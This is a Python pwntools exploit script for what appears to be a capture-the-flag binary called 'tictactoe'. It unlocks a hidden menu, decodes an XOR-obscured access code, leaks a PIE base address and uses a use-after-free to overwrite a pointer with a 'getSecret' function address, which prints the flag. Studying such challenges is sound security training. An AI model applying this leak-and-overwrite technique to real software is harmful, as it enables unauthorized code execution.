#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./tictactoe")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("94.237.61.202", 58399)

    return r


def main():
    r = conn()

    # Send specific move pattern to unlock hidden interface
    r.sendlineafter(b": ", b"0 0")
    r.sendlineafter(b": ", b"0 4")
    r.sendlineafter(b": ", b"1 1")
    r.sendlineafter(b": ", b"1 3")
    r.sendlineafter(b": ", b"2 2")
    r.sendlineafter(b": ", b"3 1")
    r.sendlineafter(b": ", b"3 3")
    r.sendlineafter(b": ", b"4 0")
    r.sendlineafter(b": ", b"4 4")

    # Send username (any is fine) and access code (retrieved from obscured pattern inside the decompiled code)
    access_code = bytes(byte ^ 0x5A for byte in b"\x1ei<k4i.6#;mk9mn9mji=;7i")
    log.info(f"{access_code = }")
    r.sendlineafter(b": ", b"Vego")
    r.sendlineafter(b": ", access_code)

    # The challenge creates a temporary executable (give some time to create it)
    sleep(2)
    c2_exec = ELF("/tmp/C2_executable")

    # Leak binary base address
    r.sendlineafter(b"> ", b"H")
    r.recvuntil(b"ID: ")
    c2_exec.address = int(r.recvline(), 16) - 0x143C
    log.info(f"pie: 0x{c2_exec.address:x}")

    # Free agent to then realloc it through Hackupdate() and change it's content
    r.sendlineafter(b"> ", b"E")
    r.sendlineafter(b"? ", b"Y")
    r.sendlineafter(b"> ", b"F")
    r.sendlineafter(b"?", p64(c2_exec.sym["getSecret"]))

    flag = r.recvlines(2)[-1].decode("ascii")
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
